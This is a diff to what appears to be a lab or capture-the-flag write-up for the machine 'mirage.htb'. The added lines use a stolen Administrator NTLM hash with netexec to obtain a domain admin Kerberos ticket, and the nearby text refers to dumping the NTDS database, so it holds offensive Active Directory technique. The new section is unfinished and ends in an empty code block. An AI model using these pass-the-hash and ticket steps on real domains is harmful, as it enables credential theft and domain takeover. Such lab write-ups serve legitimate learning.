@@ -995,8 +995,21 @@ I can then just dump the NTDS using the TGT of `DC01$`
 
 This can also be done with secretsdump
 
+```python
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u Administrator -H '7be6d4f3c2b9c0e3560f5a29eeb1afb3' -k --generate-tgt DA
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\Administrator:7be6d4f3c2b9c0e3560f5a29eeb1afb3 (Pwn3d!)
+SMB         dc01.mirage.htb 445    dc01             [+] TGT saved to: DA.ccache
+SMB         dc01.mirage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=DA.ccache
 
+❯❯❯ export KRB5CCNAME=DA.ccache
+```
 
+Ill the just get a TGT for the DA
+
+```python
+
+```
 
 
 
